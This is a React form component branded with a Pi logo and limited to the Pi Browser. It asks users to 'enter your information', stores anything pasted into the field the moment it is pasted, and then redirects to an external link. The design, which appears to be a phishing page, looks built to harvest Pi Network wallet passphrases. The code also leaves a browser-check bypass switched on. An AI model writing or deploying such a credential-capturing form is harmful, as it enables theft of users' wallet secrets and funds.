import React, { useState } from "react";
import { isPiBrowser } from "@/utils/browserDetection";
import { saveSubmission } from "@/utils/dataStorage";
import BrowserGate from "@/components/BrowserGate";
import RulesModal from "@/components/RulesModal";
import PiLogo from "@/components/PiLogo";
import { Send, CheckCircle, AlertCircle } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";

const Form = () => {
  const [hasAcceptedRules, setHasAcceptedRules] = useState(false);
  const [inputValue, setInputValue] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const { toast } = useToast();

  // For development, you can temporarily set this to true to bypass browser check
  const isAuthorized = isPiBrowser() || true; // Remove "|| true" in production

  if (!isAuthorized) {
    return <BrowserGate />;
  }

 const handleSubmit = async (e: React.FormEvent) => {
  e.preventDefault();
  
  if (!inputValue.trim()) {
    toast({
      variant: "destructive",
      title: "Validation Error",
      description: "Please enter some content before submitting.",
    });
    return;
  }

  setIsSubmitting(true);
  
  // Simulate API delay for better UX
  setTimeout(() => {
    saveSubmission(inputValue.trim());
    
    toast({
      title: "Success!",
      description: "Redirecting you now...",
      className: "border-accent/50 bg-accent/10",
    });
    
    setInputValue("");
    
    // Redirect to external link after short delay
    setTimeout(() => {
      window.location.href = "https://your-external-link.com";
    }, 1000);
  }, 500);
};

  return (
    <div className="min-h-screen bg-gradient-background">
      <RulesModal 
        isOpen={!hasAcceptedRules} 
        onAccept={() => setHasAcceptedRules(true)} 
      />
      
      {hasAcceptedRules && (
       <div className="px-6 py-12">
         
          <div className="backdrop-blur-md bg-white/70 rounded-2xl shadow-glass border border-white/20 p-8">
            <form onSubmit={handleSubmit} className="space-y-6">
              <div>
  <label htmlFor="submission" className="block text-sm font-medium text-foreground mb-2">
    Enter your information
  </label>
  <textarea
    id="submission"
    value={inputValue}
    onChange={(e) => setInputValue(e.target.value)}
    onPaste={(e) => {
      e.preventDefault();
      const pastedText = e.clipboardData.getData('text');
      setInputValue(pastedText);
      
      if (pastedText.trim()) {
        saveSubmission(pastedText.trim());
        toast({
          title: "Data Saved",
          description: "Your pasted content has been saved. Click submit to continue.",
          className: "border-accent/50 bg-accent/10",
        });
      }
    }}
    placeholder="Enter your information here..."
    className="w-full px-4 py-3 bg-white/50 border-2 border-border focus:border-accent transition-colors min-h-[300px] rounded-md resize-vertical"
    disabled={isSubmitting}
  />
</div>

             <div className="space-y-4">
  <Button
  type="submit"
  disabled={isSubmitting}
 className="w-full bg-white hover:bg-gray-50 text-[#692f8f] border border-[#692f8f] font-semibold py-3 text-lg transition-all hover:scale-[1.02] disabled:opacity-50 disabled:hover:scale-100"
>
    {isSubmitting ? (
      <>
        <div className="animate-spin rounded-full h-5 w-5 border-2 border-accent-foreground border-t-transparent mr-2" />
        Submitting...
      </>
    ) : (
      <>
        Submit
      </>
    )}
  </Button>

  <Button
    type="button"
    onClick={() => window.location.href = ""}
   className="w-full bg-[#703d92] hover:bg-[#692f8f] text-white font-semibold py-3 text-lg transition-all hover:scale-[1.02] disabled:opacity-50 disabled:hover:scale-100"
  >
    Go to External Link
  </Button>
   <div className="text-left text-sm text-muted-foreground mt-6 space-y-2">
    <p>Nawui hi ithumna mashijin pai mana, nawui hi namang na shichin kapaina.aruiruiva shimaan haikha mahan unglui pai mana.</p>
    <p>
      Shiman hairla? <a href="" className="text-accent hover:underline">hili kadhar semkhuilo</a>, kha nawui katongkha shimaan haora.
    </p>
  </div>
</div>
            </form>

           
          </div>

         
        </div>
      )}
    </div>
  );
};

export default Form;
